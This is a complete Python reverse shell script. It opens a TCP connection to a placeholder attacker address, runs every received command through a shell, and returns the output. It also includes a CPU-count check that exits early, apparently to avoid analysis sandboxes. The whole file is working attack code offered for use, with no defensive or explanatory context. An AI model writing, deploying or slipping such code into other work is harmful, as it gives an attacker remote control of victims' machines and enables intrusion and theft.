'''
Code developed by SAYANTAN PATRA
For any issues contact - sayantanpatra68@gmail.com
github - github.com/sayantancodex
'''

import os
import socket
import subprocess


if os.cpu_count() <= 2:
    quit()

HOST = 'xxx.xxx.xxx.xxx' #ip you want to send data
PORT = 0000 #port number with which you want to establish connection

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(str.encode("[*] Connection Established: "))

while 1:
    try:
        s.send(str.encode(os.getcwd() + "> "))
        data = s.recv(1024).decode("UTF-8")
        data = data.strip('\n')
        if data == "quit": 
            break
        if data[:2] == "cd":
            os.chdir(data[3:])
        if len(data) > 0:
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
            stdout_value = proc.stdout.read() + proc.stderr.read()
            output_str = str(stdout_value, "UTF-8")
            s.send(str.encode("\n" + output_str))
    except Exception as e:
        continue
    
s.close()

'''
Code developed by SAYANTAN PATRA
For any issues contact - sayantanpatra68@gmail.com
github - github.com/sayantancodex
'''